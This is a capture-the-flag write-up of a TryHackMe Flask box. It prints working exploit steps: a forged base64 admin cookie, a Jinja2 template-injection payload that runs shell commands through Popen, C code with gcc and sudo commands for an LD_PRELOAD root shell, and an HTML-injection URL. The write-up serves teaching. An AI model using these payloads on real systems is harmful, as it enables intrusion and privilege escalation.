<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol{margin:0;padding:0}table td,table th{padding:0}.c12{border-right-style:solid;padding:0pt 5pt 0pt 5pt;border-bottom-color:#4c4f53;border-top-width:0pt;border-right-width:0pt;border-left-color:#6ce26c;vertical-align:top;border-right-color:#4c4f53;border-left-width:2.2pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;width:435.2pt;border-top-color:#4c4f53;border-bottom-style:solid}.c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#afafaf;border-top-width:0pt;border-right-width:2.2pt;border-left-color:#afafaf;vertical-align:top;border-right-color:#6ce26c;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;width:28.8pt;border-top-color:#afafaf;border-bottom-style:solid}.c7{color:#4c4f53;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Courier New";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Courier New";font-style:normal}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c6{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:center}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c10{border-spacing:0;border-collapse:collapse;margin-right:auto}.c16{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c9{color:inherit;text-decoration:inherit}.c4{color:#980000;font-weight:700}.c14{font-weight:700}.c1{height:11pt}.c13{background-color:#f9f9f9}.c15{height:124.8pt}.c8{background-color:#ffff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c16"><p class="c0"><span class="c3">This box was rated as a medium difficulty by TryHackMe. This was a great box in the sense that the attacker did not have to get lucky by brute forcing a directory or password. Instead, the vulnerability came from connecting dots and researching. That being said, let&rsquo;s get right into the box!</span></p><p class="c0"><span class="c3">Enumerating the ports, we find that only ports 22 and 80 are open:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 272.00px;"><img alt="" src="images/image2.png" style="width: 624.00px; height: 272.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">Looking at the results we don&rsquo;t find anything out of the ordinary, except for the httponly flag not being set. Let&rsquo;s just check out the website and see what we find.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 232.00px;"><img alt="" src="images/image12.png" style="width: 624.00px; height: 232.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">xt file. We are met with a very simple page with a couple of directories. On the &ldquo;Our Team&rdquo; tab we find two possible users: Jed and Jad. This may or may not be useful later on, so I made sure to add this to my notes.txt file. Looking around we click on the &ldquo;Buy Gold&rdquo; tab and we see an interesting Admin option:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 230.67px;"><img alt="" src="images/image1.png" style="width: 624.00px; height: 230.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">Unfortunately the admin option is grayed out. I couldn&rsquo;t find anything more useful in this so let&rsquo;s use our trusty tool: Burpsuite! I captured a request to the /team directory and saw a couple of very strange things:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 421.33px;"><img alt="" src="images/image10.png" style="width: 624.00px; height: 421.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">First of all, there is a session cookie which is encoded in base64. Decoding this, we see that Z3Vlc3Q= is the base64 encode of guest. When base64 encoding the string &lsquo;admin&rsquo; (YWRtaW4=) and pasting that into the session cookie, we see that the content length changes! Let&rsquo;s use the developer tools, paste this base64 string in the session value, and reload the page.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 252.00px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 252.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">And we are now the admin! Unfortunately, there is not much that has changed except for the strange &lsquo;sales&rsquo; cookie which is also base64 encoded. Decoding this, we see that it corresponds to the $2,165 we see on the screen. At this point, I was stuck for a long time, but at the back of my mind was this strange server in one of my requests to the page with all the packages to be bought:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 275.00px; height: 89.00px;"><img alt="" src="images/image13.png" style="width: 275.00px; height: 89.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3 c8">Server: Werkzeug/1.0.1 Python/3.6.9</span></p><p class="c0"><span>This is what comes to mind. Seeing Werkzeug and python brings to mind that maybe Flask has something to do with this. After a lot of research, it seemed that this box might be vulnerable to SSTI (Server Side Template Injection). I came across a great article on this topic, which explained very well on how this vulnerability is exploited: </span><span class="c17"><a class="c9" href="https://www.google.com/url?q=https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee&amp;sa=D&amp;source=editors&amp;ust=1653954534767158&amp;usg=AOvVaw3cO1ZM3W9Fe-ZTh2QettjH">https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</a></span></p><p class="c0 c1"><span class="c3"></span></p><p class="c0"><span class="c3">TL;DR you can get code execution through abusing flask. Proof of concept:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 617.00px; height: 73.00px;"><img alt="" src="images/image9.png" style="width: 617.00px; height: 73.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 152.00px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 152.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">As we can see, the server evaluated 7*7 which is 49. You must find the subprocess Popen under the &lt;object&gt; class with which you will get code execution. After viewing all the sub processes within the object class, I grepped the Popen subprocess to find at which index it is located. After discovering that it was at the 402nd location, the final payload looks like the following:</span></p><p class="c0"><span class="c14">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[401](&#39;</span><span class="c4">ls</span><span class="c6">&#39;,shell=True,stdout=-1).communicate()}}</span></p><p class="c0"><span class="c3">Now that we have code execution, let&rsquo;s get a reverse shell!!</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 246.67px;"><img alt="" src="images/image3.png" style="width: 624.00px; height: 246.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">There is user.txt. One of the first things I run when getting a reverse shell is sudo -l:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 118.67px;"><img alt="" src="images/image8.png" style="width: 624.00px; height: 118.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>Unfortunately, getting root won&rsquo;t be as easy as just looking up /bin/ps on gtfobins. Fortunately, however getting root is easy nonetheless! The env_keep+=LD_PRELOAD is particularly strange. Looking this up, I came across an article that explained how to exploit this (</span><span class="c17"><a class="c9" href="https://www.google.com/url?q=https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&amp;sa=D&amp;source=editors&amp;ust=1653954534768244&amp;usg=AOvVaw0snkjC96zCdV2nbDP5tsbG">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></span><span class="c3">)</span></p><p class="c0"><span class="c3">Essentially, we want to create a shared object that will be run as root as part of the LD_PRELOAD environment. As a result, the actual function for /bin/ps will be overridden by our own binary. Using this fact, we can create a shell as root! We must compile the code below as a shared object and add it to the LD_PRELOAD environment. </span></p><a id="t.099eaa3fe8f8ca889df82a893e08d8079e81133d"></a><a id="t.0"></a><table class="c10"><tr class="c15"><td class="c11" colspan="1" rowspan="1"><p class="c5"><span class="c7">1</span></p><p class="c5"><span class="c7">2</span></p><p class="c5"><span class="c7">3</span></p><p class="c5"><span class="c7">4</span></p><p class="c5"><span class="c7">5</span></p><p class="c5"><span class="c7">6</span></p><p class="c5"><span class="c7">7</span></p><p class="c5"><span class="c7">8</span></p><p class="c5"><span class="c7">9</span></p></td><td class="c12" colspan="1" rowspan="1"><p class="c0"><span class="c2">#include &lt;stdio.h&gt;</span></p><p class="c0 c13"><span class="c2">#include &lt;sys/types.h&gt;</span></p><p class="c0"><span class="c2">#include &lt;stdlib.h&gt;</span></p><p class="c0 c13"><span class="c2">void _init() {</span></p><p class="c0"><span class="c2">unsetenv(&quot;LD_PRELOAD&quot;);</span></p><p class="c0 c13"><span class="c2">setgid(0);</span></p><p class="c0"><span class="c2">setuid(0);</span></p><p class="c0 c13"><span class="c2">system(&quot;/bin/sh&quot;);</span></p><p class="c0"><span class="c2">}</span></p></td></tr></table><p class="c0"><span class="c3">I saved the code below as exploit.c and compiled it with the following commands:</span></p><p class="c0"><span class="c6">cd /tmp</span></p><p class="c0"><span class="c6">gcc -fPIC -shared -o shell.so exploit.c -nostartfiles</span></p><p class="c0"><span class="c6">sudo LD_PRELOAD=/tmp/shell.so ps</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 168.00px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 168.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c1"><span class="c6"></span></p><p class="c0"><span class="c6">BONUS:</span></p><p class="c0"><span class="c3">I ran nikto on this website, and it found an interesting vulnerability:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 116.00px;"><img alt="" src="images/image7.png" style="width: 624.00px; height: 116.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">According to nikto, the site is vulnerability to HTML injection so let&rsquo;s try it out using the payload they suggest:</span></p><p class="c0"><span class="c6">/ts2s1NMDd1VJtKSBRcn82Yzs6CMY1u42RDsdfO6lT8XQ4d2wnexQKAEmtizMPNHTnyEq2tGZFhuZFztIsW0KFFesXGzcEkCmWUYaq4CFDSQLzsu2gpT6eeKTFGHIDulc5a6layCW57JZyywP1ULTbIaz1LScDK6V74lsCTy8jH6z49h4spfFApiSynzRB18unriHDFcu1O9DivFGpMyUrxCsBPOLZQ0&lt;font%20size=50&gt;</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 193.33px;"><img alt="" src="images/image11.png" style="width: 624.00px; height: 193.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c3">As can be seen, the font size has increased to a ridiculous size. This confirms the HTMLvulnerability. This vulnerability is not critical in the context of this box, as no other users will be using the exact same instance. However, in the case that this website were to be visited by many other users, the attacker can possibly steal their credentials by using a phishing attack. They can create a page for the victim to enter their username and password, and this information will be sent back to the attacker.<br></span></p><p class="c0"><span class="c3">This was a great box, and I thank the creator @optional for creating such a fun challenge! Thanks for reading this writeup, I hope you learned as much from this box as I did. I wish you a wonderful day (or night)!</span></p><p class="c0 c1"><span class="c3"></span></p><p class="c0 c1"><span class="c3"></span></p></body></html>